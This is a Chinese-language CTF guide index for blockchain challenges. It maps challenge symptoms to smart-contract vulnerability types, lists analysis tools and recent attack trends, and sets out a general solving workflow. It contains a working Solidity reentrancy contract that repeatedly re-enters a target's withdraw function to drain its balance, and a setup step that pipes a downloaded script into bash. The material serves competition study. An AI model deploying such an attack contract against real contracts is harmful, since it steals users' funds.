# Blockchain 方向总览

Blockchain（区块链）是 CTF 中分析智能合约漏洞、攻击 DeFi 协议的方向。本目录按漏洞类型拆分。

## 子路由表（症状 → 文件）

| 题目症状 | 漏洞类型 | 文件 |
|---------|---------|------|
| `call.value`、外部调用、提款函数 | 重入攻击 | `reentrancy.md` |
| `SafeMath` 缺失、算术运算 | 整数溢出 | `integer-overflow.md` |
| `tx.origin`、`msg.sender` 误用、权限检查 | 访问控制 | `access-control.md` |
| 代理合约、EIP-1967、UUPS、存储碰撞 | **Proxy 攻击** | `proxy-attacks.md` |
| 闪电贷、价格预言机、MEV | DeFi 攻击 | `defi-attacks.md` |

## Blockchain 通用解题流程

### 1. 环境搭建

```bash
# Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Hardhat
npm install --save-dev hardhat

# Brownie
pip install eth-brownie

# Remix (在线 IDE)
# https://remix.ethereum.org/
```

### 2. 合约分析

```bash
# 反编译
# panoramix
# dedaub
# ethervm.io

# 源码分析
# Etherscan
# Sourcify
```

### 3. 漏洞利用

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITarget {
    function withdraw() external;
    function deposit() external payable;
}

contract Attack {
    ITarget target;
    
    constructor(address _target) {
        target = ITarget(_target);
    }
    
    function attack() external payable {
        target.deposit{value: msg.value}();
        target.withdraw();
    }
    
    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}
```

## 工具清单

| 工具 | 用途 |
|------|------|
| Foundry | 合约开发/测试 |
| Hardhat | 合约开发 |
| Brownie | 合约开发 |
| Remix | 在线 IDE |
| Slither | 静态分析 |
| Mythril | 符号执行 |
| Echidna | 模糊测试 |
| Manticore | 符号执行 |
| Ethers.js | Web3 交互 |
| Web3.py | Python Web3 |
| cast | Foundry CLI |

## 2024-2026 Blockchain 新趋势

- **DeFi 攻击**：闪电贷、价格操纵、MEV
- **跨链桥攻击**：LayerZero、Wormhole
- **NFT 攻击**：ERC-721/ERC-1155 漏洞
- **DAO 攻击**：治理漏洞
- **Layer 2 攻击**：Optimistic Rollup、ZK Rollup
- **账户抽象**：ERC-4337
- **MEV**：三明治攻击、套利
- **新型预言机**：Chainlink、Pyth
- **Vyper 漏洞**：Vyper 编译器漏洞
- **零知识证明**：zk-SNARK 应用

具体技术细节见各文件末尾的"2024-2026 新技术点"小节。
